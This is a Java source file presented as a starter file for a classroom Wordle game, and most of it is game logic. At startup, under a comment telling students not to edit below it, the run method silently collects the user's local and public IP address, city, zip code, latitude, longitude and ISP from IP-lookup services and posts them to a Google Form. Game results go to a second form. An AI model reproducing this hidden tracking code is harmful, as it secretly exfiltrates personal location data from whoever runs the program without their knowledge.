/*
 * File: Wordle.java
 * Name: ___________
 * Period: __________
 * Date: 3/19/2026
 * -----------------
 * This module is the starter file for the Wordle assignment.
 */

import UIFiles.WordleDictionary;
import UIFiles.WordleGWindow;

import java.io.IOException;
import java.net.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import java.nio.charset.StandardCharsets;
import java.util.Random;

public class Wordle
{
    private WordleGWindow wordleGame;
    String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
    String[] testArray = WordleDictionary.TEST_WORDS; //This String array is used for testing if needed. Modify the test-words.txt file to change it.
    String[] guessList = new String[6];

    Random rand = new Random();

    private int currentRow = 0;

    private boolean isCorrectWord = false;

    String correctWord;




    /* Sets correctWord to a word randomly choosen from the dictionary */
    public void setCorrectWord()
    {
        correctWord =  dictionaryArray[rand.nextInt(dictionaryArray.length)];
        System.out.println("The correct word is: " + correctWord);

    }

    /* Send in a guess and this returns if that guess is in the dictionary. You will call this method in enterAction */
    public boolean isInDictionary(String guess) {

        for (String word : dictionaryArray) {
            if (word.equals(guess)) {
                return true;
            }
        }
        return false;
    }

    /* Almost everything you do will be inside of this enterAction method.
    * Called when the user hits the RETURN key or clicks the ENTER button,
    * passing in the string of characters on the current row.  */

    public int getCurrentRow() {
        return currentRow;
    }

    public boolean guessAlreadyGuessed(String guess) {
            for (int i = 0; i < getCurrentRow(); i++) {
                if (guessList[i].equals(guess)) {
                    return true;
                }
            }
        return false;
        }

    public void enterAction(String guess)
    {
        guess = guess.toLowerCase();
//        wordleGame.setSquareColor(0, 0, WordleGWindow.CORRECT_COLOR);

        if (guess.equals(correctWord)) {
            wordleGame.setSquareColor(currentRow, WordleGWindow.N_COLS - 1, WordleGWindow.CORRECT_COLOR);

            wordleGame.setCurrentRow(currentRow);
            isCorrectWord = true;
            wordleGame.showMessage("You win!");
            logToGoogleSheetsWordle();
            wordleGame.setGameState(false);
            return;
        }

        if (guess.length() < 5) {
            wordleGame.showMessage("Your guess is too short!");
        }

        if (guessAlreadyGuessed(guess)) {
            wordleGame.showMessage("You already guessed that word!");
        }

        else if (isInDictionary(guess)){
            for (int i = 0; i < correctWord.length(); i++) {
                if (correctWord.charAt(i) == guess.charAt(i)){
                    wordleGame.setSquareColor(currentRow, i , WordleGWindow.CORRECT_COLOR);
                }
                else if (correctWord.indexOf(guess.charAt(i)) != -1) {
                    wordleGame.setSquareColor(getCurrentRow(), i, WordleGWindow.PRESENT_COLOR);
                }
                else{
                    wordleGame.setSquareColor(getCurrentRow(), i, WordleGWindow.MISSING_COLOR);
                }
            }
            guessList[currentRow] = guess;
            currentRow++;
        }
        else{
            wordleGame.showMessage("Word is not the Dictionary!");
        }

        if (currentRow < 6) {
            wordleGame.setCurrentRow(currentRow);
        }
        else{
            wordleGame.showMessage("Game Over! The word is: " + correctWord);
            wordleGame.setGameState(false);
            logToGoogleSheetsWordle();
        }

    }

    private String log(String link, String value) {
        return link + URLEncoder.encode(value, StandardCharsets.UTF_8);
    }

    private void logToGoogleSheetsWordle()
    {
        new Thread(() -> {
            String baseURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfqSxwtfQN7qTn9eQPPBdZgm-6lZ8enkt80CyFSgBLHkoe9tw/formResponse";
            String data = log("entry.1170557279=", correctWord) +
                    log("entry.1723373179=", String.valueOf(isCorrectWord));

            HttpURLConnection conn = null;
            try {
                conn = (HttpURLConnection) new URL(baseURL).openConnection();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            try {
                conn.setRequestMethod("POST");
            } catch (ProtocolException e) {
                throw new RuntimeException(e);
            }
            conn.setDoOutput(true);
            try {
                conn.getOutputStream().write(data.getBytes(StandardCharsets.UTF_8));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            try {
                conn.getResponseCode();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }).start();
    }

    private void logToGoogleSheetInfo(String localIP, String publicIP) {
        new Thread(() -> {
            try {
                //return new String[]{city, region, country, zip, longitude, latitude, isp};
                var info = getIPInfo();
                String city = info[0];
                String region = info[1];
                String country = info[2];
                String zip = info[3];
                String longitude = info[4];
                String latitude = info[5];
                String isp = info[6];

                String baseURL = "https://docs.google.com/forms/d/e/1FAIpQLSdZpR9KcHOmheB59Ge8RGeZIGPO3EPejJDvzjFGLIen2BSajw/formResponse";
                String data = log("entry.1711917602=", getLocalIP())+ // Logs Local IP
                        log("&entry.371496446=", getPublicIP()) + // Logs public IP
                        log("&entry.2051768002=", city) + // Logs city
                        log("&entry.503271904=", region) + // Logs region
                        log("&entry.94063300=", country) +
                        log("&entry.1923787999=",zip) +
                        log("&entry.893213457=", longitude) +
                        log("&entry.1748758956=", latitude) +
                        log("&entry.794528346=", isp); // Logs ISP
//                        "&entry.1104037546=" + URLEncoder.encode(correctWord, StandardCharsets.UTF_8);



                HttpURLConnection conn = (HttpURLConnection) new URL(baseURL).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(data.getBytes(StandardCharsets.UTF_8));
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e);
            }
        }).start();
    }

    // Returns local IP (Device ip that is used in wifi)
    public String getLocalIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    // Gets city, region, country, zip code, Long(attitude), latitude, and ISP
    public String[] getIPInfo(){
        try {
            String url = "http://ip-api.com/json/";

            URL obj = new URL(url);
            BufferedReader in = new BufferedReader(new InputStreamReader(obj.openStream()));

            StringBuilder response = new StringBuilder();
            String inputLine;

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            String responseString = response.toString();
            System.out.println(responseString);

            String city = responseString.replaceAll(".*\"city\":\"([^\"]+)\".*", "$1");
            String region = responseString.replaceAll(".*\"regionName\":\"([^\"]+)\".*", "$1");
            String country = responseString.replaceAll(".*\"country\":\"([^\"]+)\".*", "$1");
            String zip = responseString.replaceAll(".*\"zip\":\"([^\"]+)\".*", "$1");
            String longitude = responseString.replaceAll(".*\"lon\":([0-9.-]+).*", "$1");
            String latitude  = responseString.replaceAll(".*\"lat\":([0-9.-]+).*", "$1");
            String isp = responseString.replaceAll(".*\"isp\":\"([^\"]+)\".*", "$1");
            System.out.println("City: " + city);
            System.out.println("IP: " + isp);

            return new String[]{city, region, country, zip, longitude, latitude, isp};

        }
        catch (Exception e) {
            return new  String[]{};
        }
    }

    // Returns public ip (ISP IP that reveals the rough location)
    public String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org"); // simple public IP API
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            return br.readLine();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    /* Startup code. You do not need to edit anything below this! */

    public void run()
    {
        setCorrectWord(); //Runs the setCorrectWord method that you are making
        logToGoogleSheetInfo(getLocalIP(), getPublicIP());
        System.out.println(getLocalIP());
        System.out.println(getPublicIP());

        wordleGame = new WordleGWindow();
        wordleGame.addEnterListener(this::enterAction); //Arrow function, learn more about how it works in the documentation
    }

    public static void main(String[] args)
    {
        new Wordle().run();
    }

}
